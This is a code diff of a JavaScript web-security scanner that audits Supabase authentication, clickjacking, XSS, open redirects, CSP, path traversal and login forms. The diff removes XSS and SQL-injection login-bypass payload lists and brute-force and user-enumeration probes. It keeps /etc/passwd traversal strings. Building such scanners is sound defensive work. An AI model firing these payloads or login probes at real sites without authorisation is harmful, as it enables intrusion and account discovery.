-
-  const loginRes = await safeFetch(`${supabaseUrl}/auth/v1/token?grant_type=password`, {
-    method: 'POST',
-    headers: {
-      'apikey': anonKey,
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      email: testEmail,
-      password: testPassword,
-    }),
-  });
-
-  if (loginRes) {
-    let body;
-    try { body = await loginRes.json(); } catch { body = {}; }
-
-    if (loginRes.status === 200 && body.access_token) {
-      addFinding(
-        'INFO',
-        'Auth Injection',
-        'Canary signup account obtained a normal authenticated session',
-        `User ID: ${body.user?.id || 'unknown'}\nRole: ${body.user?.role || 'authenticated'}`,
-        'Confirm that immediate sessions are intended and protected against automated signup abuse.',
-        { classification: 'confirmed', confidence: 'high', rule_id: 'vice/auth/signup-session' },
-      );
-
-      // Test what this token can do
-      spinner.text = 'Testing privileges of the injected account...';
-      const tokenTestRes = await safeFetch(`${supabaseUrl}/rest/v1/`, {
-        headers: {
-          'apikey': anonKey,
-          'Authorization': `Bearer ${body.access_token}`,
-          'Accept': 'application/openapi+json',
-        }
-      });
-
-      if (tokenTestRes && tokenTestRes.status === 200) {
-        try {
-          const schema = await tokenTestRes.json();
-          const tables = Object.keys(schema.paths || {}).map(p => p.replace('/', '')).filter(t => t.length > 0);
-          if (tables.length > 0) {
-            addFinding(
-              'INFO',
-              'Auth Injection',
-              'Authenticated schema inventory is visible to the canary user',
-              `${tables.length} table path(s) advertised by OpenAPI. This does not prove row access.`,
-              'Review exposed schema metadata if table-name disclosure is not intended.',
-              { classification: 'confirmed', confidence: 'high', rule_id: 'vice/auth/openapi-schema' },
-            );
-
-            for (const table of tables.slice(0, 12)) {
-              const tableRes = await safeFetch(`${supabaseUrl}/rest/v1/${encodeURIComponent(table)}?select=*&limit=5`, {
-                headers: {
-                  'apikey': anonKey,
-                  'Authorization': `Bearer ${body.access_token}`,
-                },
-              });
-              if (!tableRes || tableRes.status !== 200) continue;
-              let rows;
-              try { rows = await tableRes.json(); } catch { rows = null; }
-              const exposure = classifyAuthenticatedSupabaseRead(table, rows, {
-                userId: body.user?.id,
-                email: body.user?.email || testEmail,
-              });
-              if (!exposure) continue;
-              addFinding(
-                exposure.severity,
-                'Auth Injection',
-                exposure.title,
-                `${Array.isArray(rows) ? rows.length : 0} row(s) returned.${exposure.paths?.length ? ` Sensitive paths: ${exposure.paths.join(', ')}` : ''}`,
-                exposure.severity === 'INFO' ? '' : `Review authenticated SELECT policies on "${table}" and enforce row ownership.`,
-                { classification: exposure.classification, confidence: exposure.confidence, rule_id: 'vice/auth/authenticated-table-read' },
-              );
-            }
-          }
-        } catch {}
-      }
-    } else if (loginRes.status === 400 && body.msg?.includes('confirm')) {
-      addFinding('INFO', 'Auth Injection', 'Canary account login blocked pending email confirmation', 'Email confirmation prevents an immediate session.', '');
     }
   }
 
@@ -1319,15 +1168,14 @@ async function auditAuthInjection(jsContents, spinner) {
     for (const { key, label } of keysToTest) {
       const adminRes = await safeFetch(`${supabaseUrl}${endpoint}`, {
         headers: {
-          'apikey': key,
-          'Authorization': `Bearer ${key}`,
+          ...supabaseHeaders(key),
         }
       });
 
       if (adminRes && adminRes.status === 200) {
         let body;
         try { body = await adminRes.json(); } catch { body = {}; }
-        addFinding('CRITIQUE', 'Auth Injection', `Admin endpoint accessible: ${endpoint}`, `Accessible with ${label}\nResponse: ${JSON.stringify(body).substring(0, 500)}`, `The admin endpoint ${endpoint} must only be accessible with the service_role key server-side. Never from the client.`);
+        if (Array.isArray(body.users) && body.users.some(user => user.id && user.email)) addFinding('CRITIQUE', 'Auth Injection', `Admin user records accessible: ${endpoint}`, `Accessible with ${label}. User records were returned; values omitted.`, `The admin endpoint ${endpoint} must only be accessible with the service_role key server-side. Never from the client.`);
       }
     }
   }
@@ -1429,7 +1277,9 @@ async function grabBanner(ip, port, timeout = 2000) {
 }
 
 async function auditVps(spinner) {
-  const ips = [...(getScanContext()?.discoveredIps || discoveredIps)];
+  const scanContext = getScanContext();
+  const sharedHosting = scanContext?.technologies?.some(name => ['Cloudflare', 'Vercel', 'Netlify', 'Shopify', 'Webflow'].includes(name));
+  const ips = [...new Set([...(scanContext?.discoveredIps || discoveredIps), ...(sharedHosting ? [] : scanContext?.scope?.getPinnedAddresses() || [])])].slice(0, 4);
   if (ips.length === 0) {
     addFinding('INFO', 'VPS Audit', 'No IP detected', 'No VPS IP address found in client code - scan skipped', '');
     return;
@@ -1526,24 +1376,9 @@ async function auditAttackScenarios(baseUrl, jsContents, spinner) {
       const page = await createBrowserPage(browser, baseUrl);
 
       // Create a page that embeds the site in an iframe
-      const testHtml = `
-        <html><body>
-          <iframe id="target" src="${baseUrl}" width="800" height="600"></iframe>
-          <script>
-            window.addEventListener('message', e => {});
-            setTimeout(() => {
-              try {
-                const f = document.getElementById('target');
-                document.title = f.contentDocument ? 'LOADED' : 'BLOCKED';
-              } catch(e) {
-                document.title = 'CROSS-ORIGIN';
-              }
-            }, 5000);
-          </script>
-        </body></html>`;
-
-      await page.setContent(testHtml, { waitUntil: 'networkidle2', timeout: 15000 });
-      await new Promise(r => setTimeout(r, 6000));
+      const testHtml = `<html><body><iframe src="${baseUrl.replaceAll('"', '&quot;')}" width="800" height="600"></iframe></body></html>`;
+      await page.setContent(testHtml, { waitUntil: 'domcontentloaded', timeout: 10000 });
+      await page.waitForNetworkIdle({ idleTime: 250, timeout: 2000 }).catch(() => {});
 
       // Check if the iframe loaded
       const targetOrigin = new URL(baseUrl).origin;
@@ -1555,7 +1390,7 @@ async function auditAttackScenarios(baseUrl, jsContents, spinner) {
       const directRes = await safeFetch(baseUrl);
       const xfo = directRes?.headers.get('x-frame-options');
       const csp = directRes?.headers.get('content-security-policy');
-      const hasFrameProtection = xfo || (csp && csp.includes('frame-ancestors'));
+      const hasFrameProtection = hasFrameRestriction(xfo, csp);
 
       if (!hasFrameProtection && iframeLoaded) {
         addFinding('MOYENNE', 'Clickjacking', 'Site embeddable in an iframe', `${baseUrl} can be embedded in an iframe.\nAn attacker could overlay a decoy page.`, 'Add the X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors \'none\' header');
@@ -1572,96 +1407,22 @@ async function auditAttackScenarios(baseUrl, jsContents, spinner) {
     }
   }
 
-  // ── SCENARIO 2 : XSS Reflected via URL ──
-  spinner.text = 'XSS reflected test via URL parameters...';
   {
-    const xssPayloads = [
-      { name: 'Basic script', payload: '<script>alert(1)</script>' },
-      { name: 'Event handler', payload: '"><img src=x onerror=alert(1)>' },
-      { name: 'SVG onload', payload: '<svg onload=alert(1)>' },
-      { name: 'Javascript URI', payload: 'javascript:alert(1)' },
-      { name: 'Event without quotes', payload: '\' onfocus=alert(1) autofocus=\'' },
-      { name: 'Template literal', payload: '${alert(1)}' },
-    ];
-
-    const testParams = ['q', 'search', 'query', 'redirect', 'url', 'next', 'callback', 'return', 'page', 'id', 'name', 'error', 'msg', 'message'];
-
-    let browser;
+    const browser = await launchBrowser();
     try {
-      browser = await launchBrowser();
       const page = await createBrowserPage(browser, baseUrl);
-
-      let xssFound = false;
-
-      for (const param of testParams) {
-        if (xssFound) break;
-        for (const { name, payload } of xssPayloads) {
-          const testUrl = `${baseUrl}?${param}=${encodeURIComponent(payload)}`;
-
-          let alertTriggered = false;
-          page.on('dialog', async (dialog) => {
-            alertTriggered = true;
-            await dialog.dismiss();
-          });
-
-          try {
-            await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });
-          } catch {}
-
-          if (alertTriggered) {
-            addFinding('CRITIQUE', 'XSS', `XSS Reflected detected via parameter "${param}"`, `Payload: ${payload}\nURL: ${testUrl}\nThe script executes in the victim's browser.`, 'Escape all user output (HTML entities). Add a strict Content-Security-Policy. Use frameworks that escape by default (Vue, React).');
-            xssFound = true;
-            break;
-          }
-
-          // Check if the payload is reflected in the DOM without execution
-          const bodyHtml = await page.content();
-          if (bodyHtml.includes(payload)) {
-            addFinding('INFO', 'XSS', `Input reflected without script execution via "${param}"`, `The canary input was present in the rendered HTML, but no script executed. Reflection alone is not an XSS vulnerability.`, 'Keep contextual output encoding in place and avoid raw HTML sinks.', { classification: 'heuristic', confidence: 'low', rule_id: 'vice/xss/reflection-only' });
-            xssFound = true;
-            break;
-          }
-
-          page.removeAllListeners('dialog');
-        }
-      }
-
-      if (!xssFound) {
-        addFinding('INFO', 'XSS', 'No reflected XSS detected', `${xssPayloads.length} payloads tested on ${testParams.length} parameters - no reflection found`, '');
-      }
-
-      await browser.close();
-    } catch (err) {
-      if (browser) await browser.close();
-      addFinding('INFO', 'XSS', 'XSS test failed', err.message, '');
-    }
+      await auditReflectedXss({ inventory: getScanContext()?.surfaces, baseUrl, fetch: safeFetch, page, finding: addFinding, outcome: state => recordAuditCheck(getScanContext(), 'attacks', state) });
+    } finally { await browser.close(); }
+  }
+  if (!getScanContext().inputParametersAudited) {
+    getScanContext().inputParametersAudited = true;
+    await auditInputParameters({ inventory: getScanContext()?.surfaces, baseUrl, fetch: safeFetch, finding: addFinding, outcome: state => recordAuditCheck(getScanContext(), 'inputs', state) });
   }
 
   // ── SCENARIO 3 : XSS Stored - form testing ──
-  spinner.text = 'Detecting forms vulnerable to stored XSS...';
+  spinner.text = 'Inspecting observed free-text forms...';
   {
-    let browser;
-    try {
-      browser = await launchBrowser();
-      const page = await createBrowserPage(browser, baseUrl);
-      await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 15000 });
-
-      // Find all forms
-      const forms = await page.evaluate(() => {
-        return [...document.querySelectorAll('form')].map((form, i) => {
-          const inputs = [...form.querySelectorAll('input, textarea')].map(input => ({
-            name: input.name || input.id || `input_${i}`,
-            type: input.type || 'text',
-            tag: input.tagName.toLowerCase(),
-          }));
-          return {
-            action: form.action,
-            method: form.method,
-            inputs,
-            hasTextInput: inputs.some(i => ['text', 'search', 'email', 'url', 'textarea'].includes(i.type) || i.tag === 'textarea'),
-          };
-        });
-      });
+      const forms = [...(getScanContext()?.surfaces?.forms.values() || [])].map(form => ({ ...form, hasTextInput: form.inputs.some(input => ['text', 'search', 'email', 'url', 'textarea'].includes(input.type)) }));
 
       if (forms.length === 0) {
         addFinding('INFO', 'XSS Stored', 'No form detected on the page', '', '');
@@ -1677,24 +1438,24 @@ async function auditAttackScenarios(baseUrl, jsContents, spinner) {
         }
       }
 
-      await browser.close();
-    } catch (err) {
-      if (browser) await browser.close();
-    }
   }
 
   // ── SCENARIO 4 : Open Redirect ──
   spinner.text = 'Open redirect test...';
   {
     const redirectParams = ['redirect', 'url', 'next', 'return', 'returnTo', 'return_to', 'callback', 'continue', 'dest', 'destination', 'go', 'target', 'rurl', 'forward'];
-    const evilUrl = 'https://evil-attacker-site.com';
+    const evilUrl = 'https://vice-redirect-probe.invalid/';
+    let redirectChecks = 0;
     let redirectFound = false;
 
     for (const param of redirectParams) {
-      const testUrl = `${baseUrl}?${param}=${encodeURIComponent(evilUrl)}`;
+      const candidate = new URL(baseUrl);
+      candidate.searchParams.set(param, evilUrl);
+      const testUrl = candidate.href;
       try {
         const res = await safeFetch(testUrl, { timeoutMs: 8000, redirect: 'manual', cache: 'no-store' });
         if (!res) continue;
+        redirectChecks++;
         const location = res.headers.get('location') || '';
 
         // True open redirect: the Location header resolves to a different origin.
@@ -1703,18 +1464,18 @@ async function auditAttackScenarios(baseUrl, jsContents, spinner) {
         let redirectsExternally = false;
         try {
           const resolved = new URL(location, testUrl);
-          const targetOrigin = new URL(baseUrl).origin;
-          redirectsExternally = resolved.origin !== targetOrigin && resolved.hostname.includes('evil-attacker-site.com');
+          redirectsExternally = res.status >= 300 && res.status < 400 && resolved.origin === new URL(evilUrl).origin;
         } catch {}
         if (redirectsExternally) {
-          addFinding('CRITIQUE', 'Open Redirect', `Open redirect detected via parameter "${param}"`, `URL: ${testUrl}\nRedirects to: ${location}\nAn attacker can create a link that appears to come from your site but redirects to a phishing site.`, 'Validate redirect URLs server-side. Only allow redirections to your own domain.');
+          addFinding('MOYENNE', 'Open Redirect', `Open redirect detected via parameter "${param}"`, `URL: ${testUrl}\nRedirects to: ${location}\nAn attacker can create a link that appears to come from your site but redirects to a phishing site.`, 'Validate redirect URLs server-side. Only allow redirections to your own domain.');
           redirectFound = true;
           break;
         }
       } catch {}
     }
 
-    if (!redirectFound) {
+    if (!redirectFound && redirectChecks !== redirectParams.length) recordAuditCheck(getScanContext(), 'redirect', 'unknown');
+    if (!redirectFound && redirectChecks === redirectParams.length) {
       addFinding('INFO', 'Open Redirect', 'No open redirect detected', `${redirectParams.length} parameters tested - no external redirection`, '');
     }
   }
@@ -1836,20 +1597,20 @@ async function auditAttackScenarios(baseUrl, jsContents, spinner) {
       if (!csp) {
         // Check for CSP via meta tag before reporting CRITIQUE
         const cspBody = await res.text();
-        const metaCspMatch = cspBody.match(/<meta\s+http-equiv\s*=\s*["']Content-Security-Policy["'][^>]*content\s*=\s*["']([^"']+)["']/i);
+        const metaCspMatch = metaCsp(cspBody);
         if (metaCspMatch) {
-          csp = metaCspMatch[1];
+          csp = metaCspMatch;
           addFinding('FAIBLE', 'CSP', 'CSP defined via meta tag only', `Content-Security-Policy is set via <meta> tag: "${csp.substring(0, 120)}..."\nMeta tag CSP has limitations: cannot set frame-ancestors, report-uri, or sandbox directives.`, 'Move CSP to an HTTP response header for full protection');
         }
       }
       if (!csp) {
         addFinding(classifyHardeningSignal('missing-csp').severity, 'CSP', 'No Content-Security-Policy', 'CSP is a defense-in-depth control that limits the impact of an existing injection flaw. Its absence does not prove that script injection is possible.', 'Add a strict CSP. Minimal example:\nContent-Security-Policy: default-src \'self\'; script-src \'self\'; style-src \'self\' \'unsafe-inline\'; img-src \'self\' data:; connect-src \'self\' https://*.supabase.co');
       } else {
-        const scriptDirective = csp.match(/(?:^|;)\s*(?:script-src|default-src)\s+([^;]+)/i)?.[1] || '';
+        const scriptDirective = cspScriptPolicy(csp);
         if (/['"]unsafe-inline['"]/i.test(scriptDirective) && !/['"]nonce-|['"]sha(?:256|384|512)-|['"]strict-dynamic['"]/i.test(scriptDirective)) {
           addFinding('INFO', 'CSP', 'CSP script policy allows unsafe-inline', `Script policy: ${scriptDirective}`, 'Prefer nonces or hashes for inline scripts.', { classification: 'hardening', confidence: 'high', rule_id: 'vice/csp/unsafe-inline' });
         }
-        if (/['"]unsafe-eval['"]/i.test(scriptDirective)) {
+        if (/['"]unsafe-eval['"]/i.test(cspScriptPolicy(csp, 'eval'))) {
           addFinding('INFO', 'CSP', 'CSP script policy allows unsafe-eval', `Script policy: ${scriptDirective}`, 'Remove unsafe-eval when application code no longer requires it.', { classification: 'hardening', confidence: 'high', rule_id: 'vice/csp/unsafe-eval' });
         }
         if (/(?:^|\s)\*(?:\s|$)/.test(scriptDirective)) {
@@ -1873,6 +1634,10 @@ async function auditAttackScenarios(baseUrl, jsContents, spinner) {
       '..%252f..%252f..%252fetc%252fpasswd',
     ];
 
+    const baselineResponse = await safeFetch(baseUrl);
+    const baselineBody = baselineResponse ? await baselineResponse.text() : null;
+    const passwdRecord = /(?:^|\n)root:[^\n]*:0:0:[^\n]*\/(?:bin|sbin)\//;
+    let traversalChecks = 0;
     let traversalFound = false;
     for (const payload of traversalPayloads) {
       const testUrl = `${baseUrl}/${payload}`;
@@ -1880,14 +1645,16 @@ async function auditAttackScenarios(baseUrl, jsContents, spinner) {
       if (!res) continue;
       const body = await res.text();
 
-      if (body.includes('root:') && body.includes('/bin/')) {
+      traversalChecks++;
+      if (baselineBody !== null && passwdRecord.test(body) && !passwdRecord.test(baselineBody)) {
         addFinding('CRITIQUE', 'Path Traversal', 'Path traversal detected - /etc/passwd read', `URL: ${testUrl}\nThe server returns the contents of system files`, 'Validate and normalize all file paths server-side. Never construct a file path from user input.');
         traversalFound = true;
         break;
       }
     }
 
-    if (!traversalFound) {
+    if (!traversalFound && (baselineBody === null || traversalChecks !== traversalPayloads.length)) recordAuditCheck(getScanContext(), 'traversal', 'unknown');
+    if (!traversalFound && baselineBody !== null && traversalChecks === traversalPayloads.length) {
       addFinding('INFO', 'Path Traversal', 'No path traversal detected', `${traversalPayloads.length} payloads tested`, '');
     }
   }
@@ -1936,29 +1703,12 @@ async function auditLoginSecurity(baseUrl, spinner) {
     return;
   }
 
-  const page = await createBrowserPage(browser, baseUrl);
+  const loginProbe = createLoginProbe(new URL(baseUrl).origin);
+  const page = await createBrowserPage(browser, baseUrl, { loginProbe });
 
   // ── DETECT : Find the login page ──
   spinner.text = 'Searching for login page...';
-  const loginPaths = ['/login', '/auth/login', '/signin', '/auth/signin', '/sign-in', '/auth/sign-in', '/connexion', '/auth', '/account/login', '/user/login'];
-  let loginUrl = null;
-
-  // If the given URL is already a login page, use it
-  if (/login|signin|sign-in|auth|connexion/i.test(baseUrl)) {
-    loginUrl = baseUrl;
-  } else {
-    for (const path of loginPaths) {
-      const testUrl = new URL(baseUrl).origin + path;
-      const res = await safeFetch(testUrl);
-      if (res && res.status === 200) {
-        const body = await res.text();
-        if (/password|mot de passe|login|connexion|sign.?in/i.test(body)) {
-          loginUrl = testUrl;
-          break;
-        }
-      }
-    }
-  }
+  const loginUrl = await discoverLoginPage({ page, baseUrl, inventory: getScanContext()?.surfaces, fetch: safeFetch });
 
   if (!loginUrl) {
     addFinding('INFO', 'Login Audit', 'No local login form found', `No local credential form was detected on ${baseUrl}. Federated or externally hosted authentication may still be present.`, 'Audit custom or external authentication entry points separately.');
@@ -1967,10 +1717,6 @@ async function auditLoginSecurity(baseUrl, spinner) {
   }
 
   addFinding('INFO', 'Login Audit', `Login page found: ${loginUrl}`, '', '');
-
-  // Load the login page
-  await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 15000 });
-  await new Promise(r => setTimeout(r, 2000));
 
   // ── CHECK 1 : Form GET vs POST ──
   spinner.text = 'Checking form method...';
@@ -2009,9 +1755,9 @@ async function auditLoginSecurity(baseUrl, spinner) {
 
   // GET method
   if (formInfo.method === 'GET') {
-    addFinding('CRITIQUE', 'Login Audit', 'Login form uses GET method', `The password is sent in the URL!\nAction: ${formInfo.action}\nMethod: GET\nConsequences:\n- The password appears in the address bar\n- It is saved in browser history\n- It is visible in web server logs\n- It can be captured by proxies and browser extensions`, 'Change the form method to POST. NEVER send passwords via GET.');
+    addFinding('INFO', 'Login Audit', 'Login form declares GET method; submission not verified', `The DOM declares GET. JavaScript may override submission. Action: ${formInfo.action}.`, 'Change the form method to POST. NEVER send passwords via GET.');
   } else {
-    addFinding('INFO', 'Login Audit', 'Form uses POST method', 'The password is not sent in the URL - correct', '');
+    addFinding('INFO', 'Login Audit', 'Form uses POST method', 'The DOM declares POST; this alone does not establish how JavaScript submits credentials.', '');
   }
 
   // ── CHECK 2 : CSRF Token ──
@@ -2029,531 +1775,12 @@ async function auditLoginSecurity(baseUrl, spinner) {
 
   // ── CHECK 3 : HTTPS on the form ──
   if (formInfo.action && formInfo.action.startsWith('http://')) {
-    addFinding('CRITIQUE', 'Login Audit', 'Login form submitted over HTTP (not HTTPS)', `Action: ${formInfo.action}\nThe password is sent in cleartext over the network - interceptable by anyone on the same WiFi`, 'Change the form action to HTTPS');
+    addFinding('INFO', 'Login Audit', 'Login form declares an HTTP action; submission not verified', `Action: ${formInfo.action}\nActual credential transmission has not been observed.`, 'Change the form action to HTTPS');
   }
 
-  addFinding('INFO', 'Login Audit', 'Active login submissions skipped', 'The audit inspected the form without submitting credentials, reset requests, or injection payloads.', '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/login/non-destructive-mode' });
-  await browser.close();
-  return;
-
-  // ── CHECK 5 : Brute force - rate limiting ──
-  spinner.text = 'Testing rate limiting on login (5 attempts)...';
-  {
-    const fakeCredentials = Array.from({ length: 5 }, (_, index) => ({
-      email: 'brute-probe@vice-audit.test',
-      password: `wrong-${index + 1}`,
-    }));
-
-    let blocked = false;
-    const statuses = [];
-    const rateSamples = [];
-
-    for (const cred of fakeCredentials) {
-      // Reload the page for each attempt
-      await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 10000 });
-      await new Promise(r => setTimeout(r, 1000));
-
-      // Intercept the submit response
-      let responseStatus = null;
-      let responseBody = '';
-      page.on('response', async (res) => {
-        if (res.url().includes('login') || res.url().includes('signin') || res.url().includes('auth') || res.url().includes('token')) {
-          responseStatus = res.status();
-          try { responseBody = await res.text(); } catch {}
-        }
-      });
-
-      // Fill in and submit
-      try {
-        const emailSelector = formInfo.inputs.find(i => i.type === 'email' || /email|mail|user/i.test(i.name));
-        const passSelector = formInfo.inputs.find(i => i.type === 'password');
-
-        if (emailSelector && passSelector) {
-          const emailSel = emailSelector.name ? `[name="${emailSelector.name}"]` : `input[type="email"]`;
-          const passSel = passSelector.name ? `[name="${passSelector.name}"]` : `input[type="password"]`;
-
-          await page.click(emailSel).catch(() => {});
-          await page.type(emailSel, cred.email, { delay: 30 });
-          await page.click(passSel).catch(() => {});
-          await page.type(passSel, cred.password, { delay: 30 });
-
-          await Promise.all([
-            page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
-            page.keyboard.press('Enter'),
-          ]);
-
-          await new Promise(r => setTimeout(r, 1500));
-        }
-      } catch {}
-
-      // Check if we were blocked
-      const pageContent = await page.content();
-      const rateSample = { status: responseStatus, body: `${pageContent}\n${responseBody}` };
-      rateSamples.push(rateSample);
-      const rateEvidence = classifyRateLimitEvidence(rateSamples);
-      if (rateEvidence.state === 'enforced') {
-        blocked = true;
-        statuses.push(`${cred.email}: BLOCKED (${responseStatus || 'captcha/message'})`);
-        break;
-      }
-      statuses.push(`${cred.email}: ${responseStatus || 'submitted'}`);
-      page.removeAllListeners('response');
-    }
-
-    const rateEvidence = classifyRateLimitEvidence(rateSamples);
-    if (!blocked) {
-      addFinding('INFO', 'Login Audit', 'Login rate limiting not confirmed', `5 failed attempts against the same synthetic identity did not trigger a visible block.\nResults: ${statuses.join(', ')}\nThis short probe cannot prove that no higher-threshold, account-aware, IP-based, or upstream limit exists.`, 'Review server-side rate-limit telemetry and test the configured threshold in a controlled environment.', { classification: 'heuristic', confidence: 'low' });
-    } else {
-      addFinding('INFO', 'Login Audit', 'Rate limiting active on login', `Blocked after ${rateEvidence.attempt || statuses.length} attempt(s)\n${statuses.join('\n')}`, '');
-    }
-  }
-
-  // ── CHECK 6 : User enumeration ──
-  spinner.text = 'Testing user enumeration...';
-  {
-    await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 10000 });
-    await new Promise(r => setTimeout(r, 1500));
-
-    // Attempt a login with an email that probably does not exist
-    let fakeResponse = '';
-    try {
-      const emailSel = formInfo.inputs.find(i => i.type === 'email' || /email|mail|user/i.test(i.name));
-      const passSel = formInfo.inputs.find(i => i.type === 'password');
-
-      if (emailSel && passSel) {
-        const eS = emailSel.name ? `[name="${emailSel.name}"]` : 'input[type="email"]';
-        const pS = passSel.name ? `[name="${passSel.name}"]` : 'input[type="password"]';
-
-        await page.click(eS).catch(() => {});
-        await page.type(eS, 'nonexistent-user-vice-audit@test.local', { delay: 30 });
-        await page.click(pS).catch(() => {});
-        await page.type(pS, 'WrongPassword123!', { delay: 30 });
-
-        await Promise.all([
-          page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
-          page.keyboard.press('Enter'),
-        ]);
-        await new Promise(r => setTimeout(r, 2000));
-
-        fakeResponse = await page.evaluate(() => document.body.innerText);
-      }
-    } catch {}
-
-    // Now try with a common email format (admin@domain)
-    await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 10000 });
-    await new Promise(r => setTimeout(r, 1500));
-
-    let realResponse = '';
-    try {
-      const emailSel = formInfo.inputs.find(i => i.type === 'email' || /email|mail|user/i.test(i.name));
-      const passSel = formInfo.inputs.find(i => i.type === 'password');
-
-      if (emailSel && passSel) {
-        const eS = emailSel.name ? `[name="${emailSel.name}"]` : 'input[type="email"]';
-        const pS = passSel.name ? `[name="${passSel.name}"]` : 'input[type="password"]';
-
-        const domain = new URL(baseUrl).hostname;
-        await page.click(eS).catch(() => {});
-        await page.type(eS, `admin@${domain}`, { delay: 30 });
-        await page.click(pS).catch(() => {});
-        await page.type(pS, 'WrongPassword123!', { delay: 30 });
-
-        await Promise.all([
-          page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
-          page.keyboard.press('Enter'),
-        ]);
-        await new Promise(r => setTimeout(r, 2000));
-
-        realResponse = await page.evaluate(() => document.body.innerText);
-      }
-    } catch {}
-
-    // Compare error messages
-    if (fakeResponse && realResponse && fakeResponse !== realResponse) {
-      // Look for differences that reveal whether an account exists
-      const fakeHasUserNotFound = /not found|n'existe pas|no account|introuvable|unknown|user not/i.test(fakeResponse);
-      const realHasWrongPassword = /wrong password|mot de passe incorrect|invalid password|mauvais mot de passe/i.test(realResponse);
-
-      if (fakeHasUserNotFound || realHasWrongPassword) {
-        addFinding('ELEVEE', 'Login Audit', 'User enumeration possible', `Error messages differ depending on whether the email exists or not.\nNon-existent email: "${fakeResponse.substring(0, 200)}"\nPotential email (admin@): "${realResponse.substring(0, 200)}"\nAn attacker can determine which emails are registered.`, 'Use an identical generic error message in both cases: "Invalid email or password"');
-      }
-    }
-
-    // Check if a generic message is used
-    if (fakeResponse) {
-      const isGeneric = /invalid credentials|identifiants incorrects|email ou mot de passe|invalid email or password|email or password/i.test(fakeResponse);
-      if (isGeneric) {
-        addFinding('INFO', 'Login Audit', 'Generic error message used', 'The message does not reveal whether the email exists or not - good sign', '');
-      }
-    }
-  }
-
-  // ── CHECK 7 : Login over HTTPS ──
-  spinner.text = 'Verifying login is over HTTPS...';
-  if (loginUrl.startsWith('http://')) {
-    addFinding('CRITIQUE', 'Login Audit', 'Login page accessible over HTTP', `${loginUrl} does not use HTTPS.\nCredentials are transmitted in cleartext over the network.`, 'Force HTTPS on all authentication pages.');
-  }
-
-  // ── CHECK 8 : In-depth SQL injection on login ──
-  spinner.text = 'Testing SQL injection on login...';
-  {
-    const emailSel = formInfo.inputs.find(i => i.type === 'email' || /email|mail|user/i.test(i.name));
-    const passSel = formInfo.inputs.find(i => i.type === 'password');
-    const eS = emailSel ? (emailSel.name ? `[name="${emailSel.name}"]` : 'input[type="email"]') : null;
-    const pS = passSel ? (passSel.name ? `[name="${passSel.name}"]` : 'input[type="password"]') : null;
-
-    // Utility function to submit a payload and read the response
-    async function submitPayload(payload, field = 'email') {
-      await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 10000 });
-      await new Promise(r => setTimeout(r, 1000));
-
-      let responseText = '';
-      const responseHandler = async (res) => {
-        const url = res.url();
-        if (/login|auth|token|session|api/i.test(url)) {
-          try { responseText = await res.text(); } catch {}
-        }
-      };
-      page.on('response', responseHandler);
-
-      try {
-        if (eS && pS) {
-          const emailVal = field === 'email' ? payload : 'test@test.com';
-          const passVal = field === 'password' ? payload : 'testpass123';
-
-          await page.click(eS).catch(() => {});
-          await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, eS);
-          await page.type(eS, emailVal, { delay: 15 });
-          await page.click(pS).catch(() => {});
-          await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, pS);
-          await page.type(pS, passVal, { delay: 15 });
-
-          await Promise.all([
-            page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
-            page.keyboard.press('Enter'),
-          ]);
-          await new Promise(r => setTimeout(r, 2000));
-        }
-      } catch {}
-
-      page.removeAllListeners('response');
-      const pageContent = await page.content();
-      const currentUrl = page.url();
-      return { responseText, pageContent, currentUrl };
-    }
-
-    if (eS && pS) {
-      // ── PHASE 1 : Injection detection ──
-      spinner.text = 'SQL Injection - Phase 1: Detection...';
-      let sqlVulnerable = false;
-      let dbType = 'unknown';
-
-      const detectionPayloads = [
-        { payload: "' OR '1'='1", name: 'OR bypass' },
-        { payload: "' OR '1'='1' --", name: 'OR bypass with comment' },
-        { payload: "admin'--", name: 'Comment injection' },
-        { payload: "1' AND '1'='2", name: 'AND false test' },
-        { payload: "' OR 1=1--", name: 'Numeric OR' },
-        { payload: "\\' OR \\'1\\'=\\'1", name: 'Escaped quotes' },
-      ];
-
-      for (const { payload, name } of detectionPayloads) {
-        const result = await submitPayload(payload);
-
-        // Login bypass detection
-        if (!result.currentUrl.includes('login') && !result.currentUrl.includes('signin') && !result.currentUrl.includes('auth') && result.currentUrl !== loginUrl) {
-          addFinding('CRITIQUE', 'SQL Injection', 'LOGIN BYPASSED VIA SQL INJECTION', `Payload: ${payload} (${name})\nRedirected to: ${result.currentUrl}\nAn attacker can log in without knowing any password.`, 'ABSOLUTE URGENCY: Use prepared statements / ORM. NEVER concatenate inputs into SQL queries.');
-          sqlVulnerable = true;
-          break;
-        }
-
-        // Exposed SQL error
-        const combined = result.responseText + result.pageContent;
-        // Match actual SQL error output, not just tech-stack mentions of the DB name
-        if (/(?:pq:\s+ERROR|ERROR:.*?at character\s+\d+|LINE\s+\d+:\s|unterminated quoted string at or near|relation\s+"[^"]+"\s+does not exist|column\s+"[^"]+"\s+does not exist|syntax error at or near\s+")/i.test(combined)) { dbType = 'postgresql'; sqlVulnerable = true; }
-        else if (/(?:You have an error in your SQL syntax|Warning:\s+mysqli?_|near\s+'[^']*'\s+at line\s+\d+|Unknown column\s+'[^']+'|MySQLSyntaxErrorException|MariaDB server version)/i.test(combined)) { dbType = 'mysql'; sqlVulnerable = true; }
-        else if (/(?:sqlite3?\.OperationalError|near\s+"[^"]+":\s+syntax error|unrecognized token:|no such table:|no such column:)/i.test(combined)) { dbType = 'sqlite'; sqlVulnerable = true; }
-        else if (/ORA-\d{5}/i.test(combined)) { dbType = 'oracle'; sqlVulnerable = true; }
-        else if (/(?:sql server|mssql|microsoft (?:sql|ole db|odbc)|sqlclient|system\.data\.sqlclient)/i.test(combined)) { dbType = 'mssql'; sqlVulnerable = true; }
